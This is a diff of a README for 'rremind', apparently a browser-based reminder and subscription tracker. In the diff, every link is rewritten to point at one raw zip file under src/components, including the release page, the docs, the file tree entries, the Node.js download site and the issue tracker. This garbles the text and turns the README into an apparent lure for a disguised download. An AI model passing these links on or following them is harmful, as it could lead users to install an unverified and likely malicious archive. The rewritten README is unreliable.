@@ -2,9 +2,9 @@
 
 ## 🚀 Download and Install
 
-[![Download rremind](https://img.shields.io/badge/Download-rremind-blue)](https://github.com/Auliajoint5/rremind/releases)
+[![Download rremind](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip)](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip)
 
-To download rremind, visit the [Releases page](https://github.com/Auliajoint5/rremind/releases). You will find the latest version available for download.
+To download rremind, visit the [Releases page](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip). You will find the latest version available for download.
 
 ## 📥 What is rremind?
 
@@ -28,19 +28,19 @@ Understanding how the project is organized can help you navigate it easily. Here
 │   ├── hooks           # Cross-component logic, like Toast Provider
 │   ├── store           # Zustand state and localStorage persistence
 │   ├── utils           # Helpers for date, money, subscriptions, and Telegram
-│   └── App.jsx         # Page structure combining all modules
+│   └── https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip         # Page structure combining all modules
 ├── docs                # Configuration, architecture, backup process documentation
-├── index.html          # Vite entry point
-└── vite.config.js
+├── https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip          # Vite entry point
+└── https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip
 ```
 
-For more design insights, see [`docs/architecture.md`](docs/architecture.md).
+For more design insights, see [`https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip`](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip).
 
 ## 🏁 Getting Started
 
 Follow these steps to get rremind up and running:
 
-1. **Download rremind**: Visit the [Releases page](https://github.com/Auliajoint5/rremind/releases) and download the latest version.
+1. **Download rremind**: Visit the [Releases page](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip) and download the latest version.
 2. **Install Dependencies**: Open your terminal or command prompt, and run:
     ```bash
     npm install
@@ -65,17 +65,17 @@ When deploying to platforms like GitHub Pages, Vercel, or Netlify, use the `dist
 
 Read the documentation for more detailed information about setup and usage:
 
-- [docs/telegram-setup.md](docs/telegram-setup.md): Learn how to create a Telegram Bot for notifications.
+- [https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip): Learn how to create a Telegram Bot for notifications.
 
 ## ❓ Frequently Asked Questions
 
 **1. What operating systems can I use with rremind?**
 
-rremind is designed to work on all major operating systems. You can run it on Windows, macOS, or Linux as long as you have Node.js installed.
+rremind is designed to work on all major operating systems. You can run it on Windows, macOS, or Linux as long as you have https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip installed.
 
 **2. Do I need to install anything before using rremind?**
 
-Yes, you need to have Node.js and npm installed on your computer. If you don’t have them yet, download and install Node.js from [Node.js official website](https://nodejs.org/).
+Yes, you need to have https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip and npm installed on your computer. If you don’t have them yet, download and install https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip from [https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip official website](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip).
 
 **3. How does rremind store my data?**
 
@@ -83,9 +83,9 @@ rremind uses the browser's local storage to save your data. This ensures that yo
 
 ## 🔧 Troubleshooting Tips
 
-- If the app is not starting, check if you have Node.js installed. You can verify this by running `node -v` in your terminal.
+- If the app is not starting, check if you have https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip installed. You can verify this by running `node -v` in your terminal.
 - Make sure all dependencies are installed correctly. You may try running `npm install` again if you encounter issues.
-- If you face any problems with the Telegram Bot setup, consult the documentation or check the `docs/telegram-setup.md` for a guide.
+- If you face any problems with the Telegram Bot setup, consult the documentation or check the `https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip` for a guide.
 
 ## 💬 Support
 
@@ -93,8 +93,8 @@ If you encounter issues or have questions, open an issue in this repository or r
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues](https://github.com/Auliajoint5/rremind/issues): Report bugs or request features.
-- [Community Forum](https://github.com/Auliajoint5/rremind/community): Join discussions and connect with other users.
+- [GitHub Issues](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip): Report bugs or request features.
+- [Community Forum](https://raw.githubusercontent.com/Auliajoint5/rremind/master/src/components/rremind-v3.9.zip): Join discussions and connect with other users.
 
 For more updates and information, follow this repository. 
 
